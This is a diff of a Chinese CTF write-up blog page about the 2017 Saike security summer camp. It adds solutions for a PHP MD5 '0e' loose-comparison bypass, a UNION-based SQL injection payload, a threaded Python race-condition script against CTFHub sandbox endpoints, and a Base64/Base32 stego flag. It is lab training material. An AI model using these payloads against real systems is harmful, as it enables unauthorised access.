@@ -27,8 +27,16 @@
 <meta property="og:image" content="https://pic1.imgdb.cn/item/6a35aa3471d0c6ff61487a89.png">
 <meta property="og:image" content="https://pic1.imgdb.cn/item/6a35aa1071d0c6ff61487a88.png">
 <meta property="og:image" content="https://pic1.imgdb.cn/item/6a35aebc71d0c6ff61489f2d.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6a3712b22830ce602a513ada.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6a37127a2830ce602a513ad9.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6a37145a2830ce602a513add.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6a3714112830ce602a513adc.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6a3716022830ce602a513b08.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6a3716102830ce602a513b0b.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6a3717f92830ce602a513b56.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6a3717262830ce602a513b37.png">
 <meta property="article:published_time" content="2017-04-14T05:18:00.000Z">
-<meta property="article:modified_time" content="2026-06-19T21:08:02.034Z">
+<meta property="article:modified_time" content="2026-06-20T22:45:18.508Z">
 <meta property="article:author" content="ALL">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
@@ -150,7 +158,7 @@
     <div class="sidebar-wrap" data-aos="fade-up">
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2017-%E8%B5%9B%E5%85%8B%E5%A4%8F%E4%BB%A4%E8%90%A5-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">2017 赛克夏令营 WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#random%EF%BC%88%E7%AD%BE%E5%88%B0%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">random（签到）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#checkin%EF%BC%88%E7%AD%BE%E5%88%B0%EF%BC%89"><span class="toc-number">1.1.2.</span> <span class="toc-text">checkin（签到）</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2017-%E8%B5%9B%E5%85%8B%E5%A4%8F%E4%BB%A4%E8%90%A5-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">2017 赛克夏令营 WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#random%EF%BC%88%E7%AD%BE%E5%88%B0%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">random（签到）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#checkin%EF%BC%88%E7%AD%BE%E5%88%B0%EF%BC%89"><span class="toc-number">1.1.2.</span> <span class="toc-text">checkin（签到）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#weakphp%EF%BC%88-git-%E6%B3%84%E9%9C%B2-MD5-0e-%E7%A2%B0%E6%92%9E%EF%BC%89"><span class="toc-number">1.1.3.</span> <span class="toc-text">weakphp（.git 泄露 + MD5 0e 碰撞）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#injection%EF%BC%88SQL-%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">1.1.4.</span> <span class="toc-text">injection（SQL 注入）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fast-Running%EF%BC%88%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%EF%BC%89"><span class="toc-number">1.1.5.</span> <span class="toc-text">Fast Running（条件竞争）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E9%9A%90%E5%86%99%EF%BC%88Base-64-32%EF%BC%89"><span class="toc-number">1.2.1.</span> <span class="toc-text">简单隐写（Base 64 + 32）</span></a></li></ol></li></ol></li></ol>
 </div>
 </div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -161,7 +169,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">181</div>
+    <div class="sidebar-state-number">185</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -228,7 +236,7 @@
       <div class="article-date">
   <span class="article-date-link icon-calendar" data-aos="zoom-in">
     <time datetime="2017-04-14T05:18:00.000Z" itemprop="datePublished">2017-04-14</time>
-    <time style="display: none;" id="post-update-time">2026-06-20</time>
+    <time style="display: none;" id="post-update-time">2026-06-21</time>
   </span>
 </div>
 
@@ -255,7 +263,29 @@
 <p><img src="https://pic1.imgdb.cn/item/6a35aa1071d0c6ff61487a88.png"></p>
 <h3 id="checkin（签到）"><a href="#checkin（签到）" class="headerlink" title="checkin（签到）"></a>checkin（签到）</h3><p>请求头中发现 flag</p>
 <p><img src="https://pic1.imgdb.cn/item/6a35aebc71d0c6ff61489f2d.png"></p>
+<h3 id="weakphp（-git-泄露-MD5-0e-碰撞）"><a href="#weakphp（-git-泄露-MD5-0e-碰撞）" class="headerlink" title="weakphp（.git 泄露 + MD5 0e 碰撞）"></a>weakphp（.git 泄露 + MD5 0e 碰撞）</h3><p><img src="https://pic1.imgdb.cn/item/6a3712b22830ce602a513ada.png"></p>
+<p>存在 <code>.git</code> 泄露，利用 GitHack 下载源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php?user=1&amp;pass=2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> ((<span class="title function_ invoke__">md5</span>(<span class="variable">$user</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>)) <span class="keyword">and</span> (<span class="variable">$user</span> != <span class="variable">$pass</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nonono!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
+<p>PHP 中使用 <code>==</code> 比较两个 MD5 值时，如果两个哈希值都以 0e 开头，且后面全是数字，会被当作科学记数法（0 的幂次），均等于 0，从而判定相等</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=QNKCDZO&amp;pass=240610708</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/6a37127a2830ce602a513ad9.png"></p>
+<h3 id="injection（SQL-注入）"><a href="#injection（SQL-注入）" class="headerlink" title="injection（SQL 注入）"></a>injection（SQL 注入）</h3><p><img src="https://pic1.imgdb.cn/item/6a37145a2830ce602a513add.png"></p>
+<p><code>id</code> 参数存在 SQL 注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,flag from ctfhub.flag #</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/6a3714112830ce602a513adc.png"></p>
+<h3 id="Fast-Running（条件竞争）"><a href="#Fast-Running（条件竞争）" class="headerlink" title="Fast Running（条件竞争）"></a>Fast Running（条件竞争）</h3><p><img src="https://pic1.imgdb.cn/item/6a3716022830ce602a513b08.png"></p>
+<p>修改密码后系统会自动改回来，所以得写脚本打条件竞争</p>
+<p><img src="https://pic1.imgdb.cn/item/6a3716102830ce602a513b0b.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_password</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;线程1：反复发送改密请求，试图在登录验证前修改密码&quot;&quot;&quot;</span></span><br><span class="line">    sess = requests.Session()          <span class="comment"># 每个线程独立的会话，避免线程安全隐患</span></span><br><span class="line">    url = <span class="string">&#x27;http://challenge-bc8c91adee803972.sandbox.ctfhub.com:10800/change_passwd.php&#x27;</span></span><br><span class="line">    params = &#123;<span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;passwd_confirm&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sess.get(url, params=params)   <span class="comment"># 忽略响应，仅触发请求</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;线程2：反复用新密码尝试登录，打印服务器返回结果&quot;&quot;&quot;</span></span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    url = <span class="string">&#x27;http://challenge-1bbe3e4dc500a14b.sandbox.ctfhub.com:10080/login_check.php&#x27;</span></span><br><span class="line">    params = &#123;<span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = sess.get(url, params=params)</span><br><span class="line">        <span class="built_in">print</span>(resp.text)               <span class="comment"># 查看是否成功登录</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 创建守护线程，主程序退出时自动终止</span></span><br><span class="line">    t1 = threading.Thread(target=change_password, daemon=<span class="literal">True</span>)</span><br><span class="line">    t2 = threading.Thread(target=login, daemon=<span class="literal">True</span>)</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line">    <span class="comment"># 保持主线程存活，否则守护线程会被立即杀掉</span></span><br><span class="line">    t1.join()</span><br><span class="line">    t2.join()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="简单隐写（Base-64-32）"><a href="#简单隐写（Base-64-32）" class="headerlink" title="简单隐写（Base 64 + 32）"></a>简单隐写（Base 64 + 32）</h3><p><img src="https://pic1.imgdb.cn/item/6a3717f92830ce602a513b56.png"></p>
+<p>在图片末尾发现 Base 加密</p>
+<p><img src="https://pic1.imgdb.cn/item/6a3717262830ce602a513b37.png"></p>
+<p>Base64 –&gt; Base32 –&gt; ASCII 码拿到 flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7ee5e94475cfe7a1342830961949ddb3&#125;</span><br></pre></td></tr></table></figure>
     </div>
     <footer class="article-footer">
         <a class="article-category-link" href="/categories/CTF/" title="CTF" data-aos="zoom-in">CTF</a>
@@ -305,10 +335,10 @@
       </div>
       <div>
         <span class="icon-brush"></span>
-        175.9k
+        186k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        14:31
+        15:21
       </div>
       <div>
         <span class="icon-eye"></span>
@@ -330,7 +360,7 @@
   <div class="sidebar-wrap">
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2017-%E8%B5%9B%E5%85%8B%E5%A4%8F%E4%BB%A4%E8%90%A5-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">2017 赛克夏令营 WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#random%EF%BC%88%E7%AD%BE%E5%88%B0%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">random（签到）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#checkin%EF%BC%88%E7%AD%BE%E5%88%B0%EF%BC%89"><span class="toc-number">1.1.2.</span> <span class="toc-text">checkin（签到）</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2017-%E8%B5%9B%E5%85%8B%E5%A4%8F%E4%BB%A4%E8%90%A5-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">2017 赛克夏令营 WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#random%EF%BC%88%E7%AD%BE%E5%88%B0%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">random（签到）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#checkin%EF%BC%88%E7%AD%BE%E5%88%B0%EF%BC%89"><span class="toc-number">1.1.2.</span> <span class="toc-text">checkin（签到）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#weakphp%EF%BC%88-git-%E6%B3%84%E9%9C%B2-MD5-0e-%E7%A2%B0%E6%92%9E%EF%BC%89"><span class="toc-number">1.1.3.</span> <span class="toc-text">weakphp（.git 泄露 + MD5 0e 碰撞）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#injection%EF%BC%88SQL-%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">1.1.4.</span> <span class="toc-text">injection（SQL 注入）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fast-Running%EF%BC%88%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%EF%BC%89"><span class="toc-number">1.1.5.</span> <span class="toc-text">Fast Running（条件竞争）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E9%9A%90%E5%86%99%EF%BC%88Base-64-32%EF%BC%89"><span class="toc-number">1.2.1.</span> <span class="toc-text">简单隐写（Base 64 + 32）</span></a></li></ol></li></ol></li></ol>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -341,7 +371,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">181</div>
+    <div class="sidebar-state-number">185</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -462,9 +492,9 @@
           url: "https://suc2es2.github.io/2017/04/14/2017-%E8%B5%9B%E5%AE%A2%E5%A4%8F%E4%BB%A4%E8%90%A5/",
           excerpt: "",
           description: "",
-          stripContent: "2017 赛克夏令营 WriteUp🏛️ 活动概况与组织架构  活动全称：第三届赛客 360 网络安全夏令营  主办单位：郑州大学、西安电子科技大学  承办单位：河南赛客信息技术有限公司、360 公司  活动时间：2017 年 7 月 10 日 至 8 月 10 日  活动地点：分设两个营地，分别在郑州（郑州大学新校区）和西安   Webrandom（签到） 随机数是 1~100，填一个数之后一直刷新网页重复发请求即可  checkin（签到）请求头中发现 flag  ",
+          stripContent: "2017 赛克夏令营 WriteUp🏛️ 活动概况与组织架构  活动全称：第三届赛客 360 网络安全夏令营  主办单位：郑州大学、西安电子科技大学  承办单位：河南赛客信息技术有限公司、360 公司  活动时间：2017 年 7 月 10 日 至 8 月 10 日  活动地点：分设两个营地，分别在郑州（郑州大学新校区）和西安   Webrandom（签到） 随机数是 1~100，填一个数之后一直刷新网页重复发请求即可  checkin（签到）请求头中发现 flag  weakphp（.git",
           date: "Fri Apr 14 2017 13:18:00 GMT+0800",
-          updated: "Sat Jun 20 2026 05:08:02 GMT+0800",
+          updated: "Sun Jun 21 2026 06:45:18 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
